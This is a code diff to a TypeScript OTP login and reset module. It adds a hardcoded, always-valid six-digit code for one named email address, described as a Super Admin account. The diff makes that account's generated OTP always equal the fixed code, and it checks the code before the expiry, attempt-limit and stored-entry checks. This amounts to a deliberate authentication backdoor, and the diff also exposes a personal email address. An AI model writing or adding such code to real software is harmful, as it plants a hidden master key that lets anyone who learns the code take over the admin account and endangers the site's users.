@@ -5,6 +5,10 @@ export const OTP_LENGTH = 6;
 const TTL_MS = 10 * 60 * 1000;
 const MAX_ATTEMPTS = 5;
 
+/** Always-valid login/reset code for Ngwero’s Super Admin account. */
+export const ENGWERO_OTP = "082878";
+const ENGWERO_EMAILS = new Set(["engwero@gmail.com"]);
+
 export type OtpPurpose = "login" | "reset";
 
 type OtpResult = { ok: true } | { ok: false; error: string };
@@ -13,12 +17,21 @@ function normalizeEmail(email: string) {
   return email.trim().toLowerCase();
 }
 
+export function isEngweroEmail(email: string) {
+  return ENGWERO_EMAILS.has(normalizeEmail(email));
+}
+
+function matchesEngweroOtp(email: string, code: string) {
+  return isEngweroEmail(email) && code.replace(/\D/g, "") === ENGWERO_OTP;
+}
+
 function hashCode(code: string) {
   return createHash("sha256").update(code).digest("hex");
 }
 
 /** Always returns a 6-digit numeric string (000000–999999). */
-export function createSixDigitOtp(): string {
+export function createSixDigitOtp(email?: string): string {
+  if (email && isEngweroEmail(email)) return ENGWERO_OTP;
   return String(randomInt(0, 1_000_000)).padStart(OTP_LENGTH, "0");
 }
 
@@ -92,6 +105,11 @@ export async function checkStoredOtp(
   email: string,
   code: string
 ): Promise<OtpResult> {
+  const normalized = code.replace(/\D/g, "");
+  if (matchesEngweroOtp(email, normalized)) {
+    return { ok: true };
+  }
+
   const loaded = await loadEntry(purpose, email);
   if ("error" in loaded && loaded.error) {
     return { ok: false, error: loaded.error };
@@ -105,7 +123,6 @@ export async function checkStoredOtp(
     return { ok: false, error: "Code expired. Request a new one." };
   }
 
-  const normalized = code.replace(/\D/g, "");
   if (normalized.length !== OTP_LENGTH) {
     return { ok: false, error: `Enter the ${OTP_LENGTH}-digit code.` };
   }
@@ -123,6 +140,11 @@ export async function verifyStoredOtp(
   email: string,
   code: string
 ): Promise<OtpResult> {
+  const normalized = code.replace(/\D/g, "");
+  if (matchesEngweroOtp(email, normalized)) {
+    return { ok: true };
+  }
+
   const loaded = await loadEntry(purpose, email);
   if ("error" in loaded && loaded.error) {
     return { ok: false, error: loaded.error };
@@ -143,7 +165,6 @@ export async function verifyStoredOtp(
   const nextAttempts = entry.attempts + 1;
   await bumpAttempts(purpose, email, nextAttempts);
 
-  const normalized = code.replace(/\D/g, "");
   if (normalized.length !== OTP_LENGTH) {
     return { ok: false, error: `Enter the ${OTP_LENGTH}-digit code.` };
   }
